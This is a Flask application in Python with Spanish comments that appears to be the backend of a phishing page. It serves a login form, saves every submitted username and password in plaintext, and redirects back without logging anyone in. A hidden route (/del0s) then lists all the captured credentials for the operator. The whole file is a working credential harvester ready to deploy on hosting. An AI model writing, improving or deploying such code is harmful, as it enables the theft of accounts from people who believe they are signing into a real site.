import os # Importamos 'os' para leer variables de entorno
from flask import Flask, render_template, request, redirect

# --- Configuración de la Base de Datos ---
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Obtenemos la URL de la base de datos desde una variable de entorno
# Render (nuestro hosting) nos dará esta URL automáticamente.
# Si no la encuentra, usa una base de datos local 'test.db' (para pruebas).
db_url = os.environ.get('DATABASE_URL')
if not db_url:
    db_url = "sqlite:///test.db"

app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Desactiva notificaciones innecesarias
db = SQLAlchemy(app) # Inicializa la base de datos

# --- Definición del Modelo (la tabla) ---
# Esto reemplaza tu 'logins.txt'.
# Creará una tabla llamada 'logins' con columnas 'id', 'username' y 'password'.
class Logins(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), nullable=False)
    password = db.Column(db.String(100), nullable=False)

# --- Crea las tablas automáticamente ---
# Esto se ejecutará la primera vez que inicie la app en el servidor
# y creará la tabla 'logins' si no existe.
with app.app_context():
    db.create_all()

# --- Ruta para mostrar tu página de login ---
@app.route('/')
def home():
    return render_template('sss.html') # Asegúrate que tu HTML se llame así

# --- Ruta que recibe los datos del formulario ---
@app.route('/login', methods=['POST'])
def receive_data():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # --- Aquí está la magia ---
        # 1. Crea un nuevo registro
        nuevo_login = Logins(username=username, password=password)

        # 2. Añade el registro a la "sesión" de la base de datos
        db.session.add(nuevo_login)

        # 3. Confirma los cambios (guarda en la base de datos)
        db.session.commit()

        print(f"DATOS GUARDADOS EN LA BD: Usuario={username}")

    # Redirigimos de vuelta a la página principal
    return redirect('/')

# --- Inicia el servidor (SOLO PARA PRUEBAS LOCALES) ---
# El servidor de producción (Render) no usará esta parte.
# --- RUTA SECRETA PARA VER LOS DATOS ---
# Cambia "ver-datos-secretos-123" por algo que solo tú sepas
@app.route('/del0s')
def ver_datos():
    # 1. Consulta la base de datos y pide TODOS los registros de la tabla Logins
    todos_los_logins = Logins.query.all()

    # 2. Muestra la página 'admin.html' y envíale la lista de datos
    return render_template('admin.html', todos_los_logins=todos_los_logins)

if __name__ == '__main__':
    app.run(debug=True)